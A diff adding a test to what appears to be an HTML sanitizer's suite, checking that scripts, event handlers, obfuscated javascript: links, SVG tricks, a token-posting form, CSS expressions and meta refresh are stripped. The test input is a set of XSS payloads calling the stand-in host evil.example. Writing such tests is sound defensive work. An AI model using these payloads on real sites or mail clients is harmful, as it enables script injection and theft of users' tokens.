@@ -182,3 +182,32 @@ test('unwraps encoded click wrappers when the destination is still visible', () 
 	const hrefs = [...document.querySelectorAll('a')].map(anchor => anchor.getAttribute('href'));
 	assert.deepEqual(hrefs, links.map(([, expected]) => expected));
 });
+
+test('strips scripts and executable markup even when remote images stay', () => {
+	const { document, html } = render(`
+		<script>fetch('https://evil.example')</script>
+		<img src="https://cdn.example.com/logo.png" width="40" height="40" onerror="fetch('https://evil.example')">
+		<a href="java\tscript:fetch('https://evil.example')">x</a>
+		<svg>
+			<set attributeName="onmouseover" to="fetch('https://evil.example')"></set>
+			<foreignObject><iframe src="https://evil.example"></iframe></foreignObject>
+			<use href="data:image/svg+xml,<svg><script>fetch('https://evil.example')</script></svg>"></use>
+		</svg>
+		<form action="https://evil.example/steal"><input name="token" value="1"><span>keep</span></form>
+		<div style="width:expression(fetch('https://evil.example'));background:url(javascript:fetch(1))">t</div>
+		<meta http-equiv="refresh" content="0;url=https://evil.example">
+	`, { blockRemote: false, stripPixels: false, rewriteLinks: false });
+	assert.equal(document.querySelector('script'), null);
+	assert.equal(document.querySelector('iframe'), null);
+	assert.equal(document.querySelector('form'), null);
+	assert.equal(document.querySelector('set'), null);
+	assert.equal(document.querySelector('foreignObject'), null);
+	assert.equal(document.querySelector('meta'), null);
+	assert.equal(document.querySelector('img').getAttribute('src'), 'https://cdn.example.com/logo.png');
+	assert.equal(document.querySelector('img').hasAttribute('onerror'), false);
+	assert.equal(document.querySelector('a').hasAttribute('href'), false);
+	assert.equal(document.querySelector('use').hasAttribute('href'), false);
+	assert.match(document.body.textContent, /keep/);
+	assert.doesNotMatch(document.querySelector('div').getAttribute('style') || '', /expression|javascript:/i);
+	assert.doesNotMatch(html, /evil\.example\/steal|http-equiv/i);
+});
